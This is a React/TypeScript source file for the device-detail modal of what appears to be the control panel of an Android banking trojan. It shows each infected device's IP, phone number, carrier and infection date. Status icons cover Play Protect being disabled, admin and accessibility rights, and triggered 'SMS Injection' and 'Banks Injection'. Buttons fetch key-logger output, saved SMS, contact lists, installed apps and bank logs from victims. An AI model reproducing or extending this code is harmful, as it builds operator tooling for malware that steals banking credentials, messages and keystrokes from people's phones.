import { Modal, Row, Col, Button } from 'antd';
import { useContext } from 'react';
import { BotStateType, BotRowType } from '../../common/DataType';
import { BotContext } from './providers';
import { renderToString } from "react-dom/server"

import {
  BankOutlined,
  EyeOutlined,
  UserOutlined,
  PicLeftOutlined,
  SafetyCertificateOutlined,
  DollarCircleOutlined,
  BoxPlotOutlined,
  EyeInvisibleOutlined,
  MessageOutlined
} from '@ant-design/icons';
import BotLog from './BotLog';
import { getLog } from './services';
import { changeResponseToClient } from '../../common/Utility';
// import { getBankLog } from '../Log/services';


// eslint-disable-next-line import/no-anonymous-default-export
export default () => {
  const { state, setState } = useContext(BotContext)

  const handleOk = () => {
    setState((state: BotStateType) => {
      return {
        ...state,
        botInfoModal: false
      }
    })
  };

  const handleCancel = () => {
    setState((state: BotStateType) => {
      return {
        ...state,
        botInfoModal: false
      }
    })
  }

  const getBank = (banks: any) => {
    let content = []
    if (banks !== '') {
      content = banks.split(':')

      return (
        <>
          {content.map((item: string) => {
            return (
              <div className='flex'><BankOutlined className='mt-1' /> <div className=''>&nbsp;{item}</div></div>
            )
          })}
        </>

      )
    } else {
      return (
        <span>{banks}</span>
      )
    }
  }

  const actions = (logType: string) => {
    setState((state: BotStateType) => ({
      ...state,
      botLogModal: true,
      botLogType: logType
    }))

    getLog(state.botId, logType).then((res: any) => {

      setState((state: BotStateType) => ({
        ...state,
        botTypeLogs: res?.map((item: any) => (changeResponseToClient(item)))
      }))
    })

  }

  const servicesIcons = (record: BotRowType) => {

    let html = "<center>";

    // USER LOOK AT SCREEN
    if (Number(record.statScreen) === 1) {
      html += renderToString(<EyeOutlined title='User looks at the screen' className='!text-green-500' />)
    }
    else {
      html += renderToString(<EyeInvisibleOutlined title='User does not look at the screen' className='!text-stone-500' />)
    }
    html += ' ';

    // ACCESIBILITY STATUS
    if (Number(record.statAccessibility) === 1) {
      html += renderToString(<BoxPlotOutlined title='Accessibility enabled' className='!text-green-500' />)
    }
    else {
      html += renderToString(<BoxPlotOutlined title='Accessibility disabled' className='!text-stone-500' />)
    }
    html += ' ';

    // ADMIN RIGHTS STATUS
    if (Number(record.statAdmin) === 1) {
      html += renderToString(<UserOutlined title='There are admin rights' className='!text-green-500' />)
    }
    else {
      html += renderToString(<UserOutlined title='No admin rights' className='!text-stone-500' />)
    }
    html += ' ';

    // PROTECT STATUS
    if (Number(record.statProtect) === 0) {
      html += renderToString(<SafetyCertificateOutlined title='Play Protect disabled' className='!text-green-500' />)
    }
    else if (Number(record.statProtect) === 2) {
      html += renderToString(<SafetyCertificateOutlined title='Play Protect status not defined' className='!text-yellow-500' />)
    }
    else {
      html += renderToString(<SafetyCertificateOutlined title='Play Protect enabled' className='!text-stone-500' />)
    }
    html += ' ';

    if (Number(record.statSMS) === 1) {
      html += renderToString(<MessageOutlined title='SMS Injection Triggered' className='!text-green-500' />)
    }
    else {
      html += renderToString(<MessageOutlined title='SMS Injection not Triggered' className='!text-yellow-500' />)
    }
    html += ' ';

    // BANK INJECT STATUS
    if (Number(record.statBanks) === 1) {
      html += renderToString(<DollarCircleOutlined title='Banks Injection Triggered' className='!text-green-500' />)
    }
    else {
      html += renderToString(<DollarCircleOutlined title='Banks Injection not Triggered' className='!text-stone-500' />)
    }
    html += ' ';

    // MODULE STATUS
    if (Number(record.statDownloadModule) === 1) {
      html += renderToString(<PicLeftOutlined title='Module loaded' className='!text-green-500' />)
    }
    else {
      html += renderToString(<PicLeftOutlined title='Module not loaded' className='!text-stone-500' />)
    }

    html += '</center>';

    return html;
  }

  return (
    <Modal centered title="Bot Information" visible={state.botInfoModal} onOk={handleOk} onCancel={handleCancel}>
      <Row className='mb-2'>
        <Col span={20} offset={2} className='border-b	border-stone-800'>
          <label htmlFor="" className='float-left'>Bot</label>
          <label htmlFor="" className='float-right'>{state.bot.botId}</label>
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={20} offset={2} className='border-b	border-stone-800'>
          <label htmlFor="" className='float-left'>IP</label>
          <label htmlFor="" className='float-right'>{state.bot.ip}</label>
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={20} offset={2} className='border-b	border-stone-800'>
          <label htmlFor="" className='float-left'>Operator</label>
          <label htmlFor="" className='float-right'>{state.bot.operator}</label>
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={20} offset={2} className='border-b	border-stone-800'>
          <label htmlFor="" className='float-left'>Phone Number</label>
          <label htmlFor="" className='float-right'>{state.bot.phoneNumber}</label>
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={20} offset={2} className='border-b	border-stone-800'>
          <label htmlFor="" className='float-left'>Model</label>
          <label htmlFor="" className='float-right'>{state.bot.model}</label>
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={20} offset={2} className='border-b	border-stone-800'>
          <label htmlFor="" className='float-left'>Tag</label>
          <label htmlFor="" className='float-right'>{state.bot.tag}</label>
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={20} offset={2} className='border-b	border-stone-800'>
          <label htmlFor="" className='float-left'>Country</label>
          <img className='float-right' src={`/images/flag/${state.bot.country}.png`} />
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={20} offset={2} className='border-b	border-stone-800'>
          <label htmlFor="" className='float-left'>Last connect</label>
          <label htmlFor="" className='float-right'>{state.bot.lastConnect}</label>
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={20} offset={2} className='border-b	border-stone-800'>
          <label htmlFor="" className='float-left'>Date infection</label>
          <label htmlFor="" className='float-right'>{state.bot.dateInfection}</label>
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={20} offset={2} className='border-b	border-stone-800'>
          <label htmlFor="" className='float-left'>Banks</label>
          <label htmlFor="" className='float-right'>{getBank(state.bot.banks)}</label>
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={20} offset={2} className='border-b	border-stone-800'>
          <label htmlFor="" className='float-left'>Comment</label>
          <label htmlFor="" className='float-right'>{state.bot.comment.length > 15 ? state.bot.comment.substring(0, 15) + '...' : state.bot.comment}</label>
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={20} offset={2} className='border-b	border-stone-800'>
          <label htmlFor="" className='float-left'>Locale</label>
          <label htmlFor="" className='float-right'>{state.bot.locale}</label>
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={20} offset={2} className='border-b	border-stone-800'>
          <div className='!pb-1' dangerouslySetInnerHTML={{ __html: servicesIcons(state.bot) }}></div>
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={20} offset={2} className='border-b	border-stone-800 !flex'>
          <Button className='flex-1 mr-1' onClick={() => actions('sms')}>SMS, USSD, Events</Button>
          <Button className='flex-1 ml-1 mr-1' onClick={() => actions('keyLogger')}>Key Logger</Button>
          <Button className='flex-1 ml-1' onClick={() => actions('savedSms')}>Saved SMS</Button>
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={20} offset={2} className='border-b	border-stone-800 !flex'>
          <Button className='flex-1 mr-1' onClick={() => actions('installedApp')}>Installed Apps</Button>
          <Button className='flex-1 ml-1 mr-1' onClick={() => actions('contactList')}>Contact List</Button>
          <Button className='flex-1 ml-1' onClick={() => actions('bankLogs')}>Logs</Button>
        </Col>
      </Row>
      <BotLog />
    </Modal>
  )
}